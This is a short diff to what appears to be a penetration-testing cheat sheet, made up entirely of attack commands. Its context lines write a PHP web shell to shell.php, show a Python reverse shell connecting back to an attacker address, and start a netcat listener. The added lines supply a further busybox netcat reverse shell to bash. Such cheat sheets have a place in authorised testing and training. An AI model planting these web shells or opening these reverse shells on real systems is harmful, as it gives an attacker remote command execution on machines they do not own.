@@ -1116,6 +1116,9 @@ echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
 shell.php&cmd=
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 nc -nlvp 22
+or
+
+busybox nc $IP 5000 -e /bin/bash
 ````
 ````
  &cmd=whoami or ?cmd=whoami
